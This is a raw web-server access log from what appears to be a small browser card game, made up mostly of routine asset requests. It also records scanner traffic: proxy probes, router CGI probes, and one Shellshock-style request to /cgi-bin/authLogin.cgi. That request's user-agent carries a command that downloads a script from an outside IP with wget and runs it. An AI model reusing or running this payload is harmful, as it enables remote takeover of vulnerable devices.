Starting up http-server, serving ./
Available on:
  http://127.0.0.1:8080
  http://127.0.0.1:8080
  http://85.214.111.42:8080
Hit CTRL-C to stop the server
[Sun Sep 10 2017 17:41:05 GMT+0200 (CEST)] "GET /images/cards/schelln9er.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:10 GMT+0200 (CEST)] "GET /images/trump/Herz.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:10 GMT+0200 (CEST)] "GET /images/cards/herzUnter.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:10 GMT+0200 (CEST)] "GET /images/trump/Herz.png" Error (404): "Not found"
[Sun Sep 10 2017 17:41:10 GMT+0200 (CEST)] "GET /images/cards/eichel9er.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:10 GMT+0200 (CEST)] "GET /images/cards/schellnOber.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:10 GMT+0200 (CEST)] "GET /images/cards/schelln8er.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:22 GMT+0200 (CEST)] "GET /images/trump/Herz.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:22 GMT+0200 (CEST)] "GET /images/trump/Herz.png" Error (404): "Not found"
[Sun Sep 10 2017 17:41:30 GMT+0200 (CEST)] "GET /images/cards/eichel7er.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:30 GMT+0200 (CEST)] "GET /images/trump/Schellen.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:30 GMT+0200 (CEST)] "GET /images/trump/Schellen.png" Error (404): "Not found"
[Sun Sep 10 2017 17:41:37 GMT+0200 (CEST)] "GET /images/cards/schelln10er.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:39 GMT+0200 (CEST)] "GET /images/cards/grasSau.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:39 GMT+0200 (CEST)] "GET /images/cards/schelln7er.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:41 GMT+0200 (CEST)] "GET /images/trump/Herz.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:41 GMT+0200 (CEST)] "GET /images/trump/Herz.png" Error (404): "Not found"
[Sun Sep 10 2017 17:41:43 GMT+0200 (CEST)] "GET /images/trump/Gras.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:43 GMT+0200 (CEST)] "GET /images/trump/Gras.png" Error (404): "Not found"
[Sun Sep 10 2017 17:41:44 GMT+0200 (CEST)] "GET /images/trump/Schellen.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:44 GMT+0200 (CEST)] "GET /images/trump/Schellen.png" Error (404): "Not found"
[Sun Sep 10 2017 17:41:49 GMT+0200 (CEST)] "GET /images/trump/Herz.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:49 GMT+0200 (CEST)] "GET /images/trump/Herz.png" Error (404): "Not found"
[Sun Sep 10 2017 17:41:50 GMT+0200 (CEST)] "GET /images/cards/herz7er.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:53 GMT+0200 (CEST)] "GET /images/trump/Eichel.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:53 GMT+0200 (CEST)] "GET /images/trump/Eichel.png" Error (404): "Not found"
[Sun Sep 10 2017 17:41:54 GMT+0200 (CEST)] "GET /images/cards/grasK%C3%B6nig.svg" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:55 GMT+0200 (CEST)] "GET /images/trump/Schellen.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:41:55 GMT+0200 (CEST)] "GET /images/trump/Schellen.png" Error (404): "Not found"
[Sun Sep 10 2017 17:42:02 GMT+0200 (CEST)] "GET /images/trump/Schellen.png" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Sun Sep 10 2017 17:42:02 GMT+0200 (CEST)] "GET /images/trump/Schellen.png" Error (404): "Not found"
[Sun Sep 10 2017 18:12:22 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Sun Sep 10 2017 18:54:44 GMT+0200 (CEST)] "GET /" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /styles.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /app/components/0_login/login.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /app/components/1_overview/overview.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /app/components/2_lobby/lobby.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /app/components/3_game/game.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /app/components/4_error/error.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /bower_components/angular/angular.min.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /bower_components/angular-ui-router/release/angular-ui-router.min.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /bower_components/angular-animate/angular-animate.min.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:45 GMT+0200 (CEST)] "GET /bower_components/angular-websocket/dist/angular-websocket.min.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /bower_components/angular-local-storage/dist/angular-local-storage.min.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /bower_components/materialize/dist/js/materialize.min.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/app.module.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/app.config.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/app.routes.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/services/wildsowSocket.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /index.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/components/0_login/login.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/components/1_overview/overview.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/components/2_lobby/lobby.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/components/3_game/game.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:46 GMT+0200 (CEST)] "GET /app/components/4_error/error.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:47 GMT+0200 (CEST)] "GET /app/components/0_login/login.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:47 GMT+0200 (CEST)] "GET /favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:47 GMT+0200 (CEST)] "GET /favicon.ico" Error (404): "Not found"
[Sun Sep 10 2017 18:54:47 GMT+0200 (CEST)] "GET /images/login-bg.jpg" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:47 GMT+0200 (CEST)] "GET /images/wildsow.png" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:56 GMT+0200 (CEST)] "GET /app/components/1_overview/overview.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:54:56 GMT+0200 (CEST)] "GET /images/wildsow2.png" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:55:16 GMT+0200 (CEST)] "GET /bower_components/angular/angular.min.js.map" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:55:16 GMT+0200 (CEST)] "GET /bower_components/angular-ui-router/release/angular-ui-router.min.js.map" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:55:16 GMT+0200 (CEST)] "GET /bower_components/angular-animate/angular-animate.min.js.map" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:55:16 GMT+0200 (CEST)] "GET /bower_components/angular-websocket/dist/angular-websocket.min.js.map" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 18:55:16 GMT+0200 (CEST)] "GET /bower_components/angular-local-storage/dist/angular-local-storage.min.js.map" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
[Sun Sep 10 2017 19:20:16 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
[Sun Sep 10 2017 21:17:37 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Sun Sep 10 2017 21:22:07 GMT+0200 (CEST)] "GET http://www.google.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
[Sun Sep 10 2017 23:14:17 GMT+0200 (CEST)] "GET http://www.google.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
[Sun Sep 10 2017 23:43:01 GMT+0200 (CEST)] "GET /hndUnblock.cgi" "Wget(linux)"
[Sun Sep 10 2017 23:43:01 GMT+0200 (CEST)] "GET /hndUnblock.cgi" Error (404): "Not found"
[Sun Sep 10 2017 23:43:02 GMT+0200 (CEST)] "GET /tmUnblock.cgi" "Wget(linux)"
[Sun Sep 10 2017 23:43:02 GMT+0200 (CEST)] "GET /tmUnblock.cgi" Error (404): "Not found"
[Sun Sep 10 2017 23:43:02 GMT+0200 (CEST)] "GET /moo" "Wget(linux)"
[Sun Sep 10 2017 23:43:02 GMT+0200 (CEST)] "GET /moo" Error (404): "Not found"
[Sun Sep 10 2017 23:43:03 GMT+0200 (CEST)] "GET /" "Wget(linux)"
[Sun Sep 10 2017 23:58:52 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 00:30:13 GMT+0200 (CEST)] "GET /" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
[Mon Sep 11 2017 03:49:29 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 04:00:36 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 05:21:31 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 05:23:31 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 08:06:09 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 08:32:22 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 08:48:52 GMT+0200 (CEST)] "GET /cgi-bin/authLogin.cgi" "() { :; }; /bin/rm -rf /tmp/S0.php && /bin/mkdir -p /share/HDB_DATA/.../ && /usr/bin/wget -c http://192.192.78.216:9090/gH/S0.php -O /tmp/S0.sh  && /bin/sh /tmp/S0.sh 0<&1 2>&1 "
[Mon Sep 11 2017 08:48:52 GMT+0200 (CEST)] "GET /cgi-bin/authLogin.cgi" Error (404): "Not found"
[Mon Sep 11 2017 09:58:26 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 11:04:47 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
[Mon Sep 11 2017 11:26:50 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 12:32:30 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
[Mon Sep 11 2017 13:01:22 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 13:12:26 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
[Mon Sep 11 2017 13:21:27 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 13:26:47 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
[Mon Sep 11 2017 14:01:40 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
[Mon Sep 11 2017 14:02:49 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 14:25:35 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 15:27:18 GMT+0200 (CEST)] "GET /" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
[Mon Sep 11 2017 15:39:13 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 16:08:45 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 16:38:48 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
[Mon Sep 11 2017 16:43:57 GMT+0200 (CEST)] "GET /" "Mozilla/5.0 zgrab/0.x"
[Mon Sep 11 2017 17:52:20 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 18:53:57 GMT+0200 (CEST)] "GET http://www.bing.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)"
[Mon Sep 11 2017 19:59:42 GMT+0200 (CEST)] "GET /" "undefined"
[Mon Sep 11 2017 21:18:33 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 21:26:54 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 22:03:10 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Mon Sep 11 2017 23:54:00 GMT+0200 (CEST)] "GET http://www.bing.com" "Chrome/41.0.2228.0 Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /app/components/0_login/login.css" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /app/components/1_overview/overview.css" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /app/components/3_game/game.css" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /app/components/2_lobby/lobby.css" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /app/components/4_error/error.css" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /bower_components/angular/angular.min.js" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /styles.css" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /bower_components/angular-ui-router/release/angular-ui-router.min.js" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /bower_components/angular-animate/angular-animate.min.js" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /bower_components/angular-websocket/dist/angular-websocket.min.js" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /bower_components/angular-local-storage/dist/angular-local-storage.min.js" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /bower_components/materialize/dist/js/materialize.min.js" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /app/app.module.js" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
[Tue Sep 12 2017 00:02:23 GMT+0200 (CEST)] "GET /app/app.config.js" "Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017U Build/MOB31K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
